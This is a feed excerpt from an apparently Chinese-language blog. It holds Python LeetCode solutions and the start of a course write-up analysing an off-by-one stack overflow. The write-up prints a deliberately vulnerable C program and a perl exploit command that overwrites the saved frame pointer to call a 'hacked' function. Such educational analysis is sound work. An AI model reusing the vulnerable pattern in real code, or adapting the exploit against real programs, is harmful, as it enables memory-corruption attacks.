&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ret_list&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(newInterval)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len(intervals):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ret_list&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(intervals[i])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ret_list
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只要注意细节，这个题目其实并不难。&lt;/p&gt;
&lt;h2 id=&#34;300-longest-increasing-subsequencehttpsleetcodecomproblemslongest-increasing-subsequence&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://leetcode.com/problems/longest-increasing-subsequence/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;300. Longest Increasing Subsequence&lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;显然是一个动态规划问题。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dp[i]&lt;/code&gt; 表示以某个数字结尾的最长递增子序列的长度。&lt;/p&gt;
&lt;p&gt;每次加入一个元素，我们更新当前的 &lt;code&gt;dp&lt;/code&gt; 数组，如果当前数字比之前的小，它们的结果就加 1。&lt;/p&gt;
&lt;p&gt;注意，第一个 &lt;code&gt;dp[i]&lt;/code&gt; 是从下标 1 开始的。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Solution&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lengthOfLIS&lt;/span&gt;(self, nums: List[int]) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; int:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        dp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; len(nums)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, len(nums)):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(i):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; nums[j] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; nums[i]:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    dp[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; max(dp[i], dp[j] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; max(dp)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;复杂度分析&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;时间复杂度：$O(n^2)$，因为有两个嵌套的循环。&lt;/li&gt;
&lt;li&gt;空间复杂度：$O(n)$，因为需要一个长度为 &lt;code&gt;n&lt;/code&gt; 的 &lt;code&gt;dp&lt;/code&gt; 数组。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;674-longest-continuous-increasing-subsequencehttpsleetcodecomproblemslongest-continuous-increasing-subsequence&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://leetcode.com/problems/longest-continuous-increasing-subsequence/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;674. Longest Continuous Increasing Subsequence&lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;这是一个简单题目，但仍然值得理解。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Solution&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;findLengthOfLCIS&lt;/span&gt;(self, nums: List[int]) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; int:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        dp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; len(nums)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, len(nums)):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; nums[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; nums[i&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                dp[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; max(dp[i], dp[i&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; max(dp)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;392-is-subsequencehttpsleetcodecomproblemsis-subsequence&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://leetcode.com/problems/is-subsequence/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;392. Is Subsequence&lt;/a&gt;
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Solution&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isSubsequence&lt;/span&gt;(self, s: str, t: str) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; bool:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len(s) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len(t):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; s[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; t[j]:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            j &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; len(s)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个题目可以用双指针法，以 &lt;code&gt;t&lt;/code&gt; 为基准，如果 &lt;code&gt;s&lt;/code&gt; 中有相同字符就向前推进，如果 &lt;code&gt;s&lt;/code&gt; 到结尾了，说明匹配完成。&lt;/p&gt;
&lt;h2 id=&#34;115-distinct-subsequenceshttpsleetcodecomproblemsdistinct-subsequences&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://leetcode.com/problems/distinct-subsequences/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;115. Distinct Subsequences&lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;这个问题要求我们找到字符串 &lt;code&gt;s&lt;/code&gt; 中有多少不同的子序列等于字符串 &lt;code&gt;t&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;首先，我们需要定义 &lt;code&gt;dp&lt;/code&gt;，其中 &lt;code&gt;dp[i][j]&lt;/code&gt; 表示从 &lt;code&gt;s&lt;/code&gt; 的前 &lt;code&gt;i&lt;/code&gt; 个字符中形成 &lt;code&gt;t&lt;/code&gt; 的前 &lt;code&gt;j&lt;/code&gt; 个字符的不同子序列数。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dp[i][0]&lt;/code&gt; 表示当 &lt;code&gt;t&lt;/code&gt; 为空串时，结果为 1。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dp[0][j]&lt;/code&gt; 表示从空串中形成 &lt;code&gt;t&lt;/code&gt;，结果为 0。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于 &lt;code&gt;dp[i][j]&lt;/code&gt;，其结果取决于位置 &lt;code&gt;i&lt;/code&gt; 和 &lt;code&gt;j&lt;/code&gt; 的字符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果两者相等，结果等于不匹配 &lt;code&gt;s[i-1]&lt;/code&gt; 的情况（&lt;code&gt;dp[i-1][j]&lt;/code&gt;）加上匹配的情况（&lt;code&gt;dp[i-1][j-1]&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;如果不相等，则结果等于 &lt;code&gt;dp[i-1][j]&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注意，这里 &lt;code&gt;i, j&lt;/code&gt; 指的是前 &lt;code&gt;i&lt;/code&gt; 个和前 &lt;code&gt;j&lt;/code&gt; 个字符。&lt;/p&gt;
&lt;p&gt;此外，&lt;code&gt;dp[0][0]&lt;/code&gt; 初始化为 1，因为空字符串是任何字符串的子序列。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Solution&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;numDistinct&lt;/span&gt;(self, s: str, t: str) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; int:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        dp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(t) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(s) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(s) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            dp[i][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, len(t) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, len(s) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; s[i&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; t[j&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    dp[i][j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dp[i&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][j] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; dp[i&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][j&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    dp[i][j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dp[i&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][j]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Off-by-One 溢出攻击分析</title>
        <link>https://nansenli.com/zh-cn/post/2024/10/oboattact-md/</link>
        <pubDate>Tue, 15 Oct 2024 14:18:44 +0000</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2024/10/oboattact-md/</guid>
        <description>&lt;h1 id=&#34;off-by-one-溢出攻击分析&#34;&gt;Off-by-One 溢出攻击分析
&lt;/h1&gt;&lt;h2 id=&#34;背景&#34;&gt;背景
&lt;/h2&gt;&lt;p&gt;上周，我参加了一门安全课程，其中包含了一个 off-by-one 溢出漏洞的示例。以下是原始代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 简单的 off-by-one 溢出示例 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;input) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;strncpy&lt;/span&gt;(buf, input, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(buf));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  buf[&lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(buf)] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bar&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I&amp;#39;ve been hacked&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (argc &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Usage: %s input_string&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;exit&lt;/span&gt;(EXIT_FAILURE);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;利用此漏洞的攻击命令是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;perl -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system &amp;#34;./obo&amp;#34;, &amp;#34;\x38\x84\x04\x08&amp;#34;x256&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行此命令的结果是屏幕上打印出多行 &lt;code&gt;I&#39;ve been hacked&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&#34;分析&#34;&gt;分析
&lt;/h2&gt;&lt;p&gt;当程序进入 &lt;code&gt;foo&lt;/code&gt; 函数时，内存布局如下（使用 GDB 观察到）：&lt;/p&gt;
&lt;p&gt;从上到下，布局包含返回地址、保存的帧指针（saved frame pointer）和缓冲区 (&lt;code&gt;buf&lt;/code&gt;)。&lt;/p&gt;
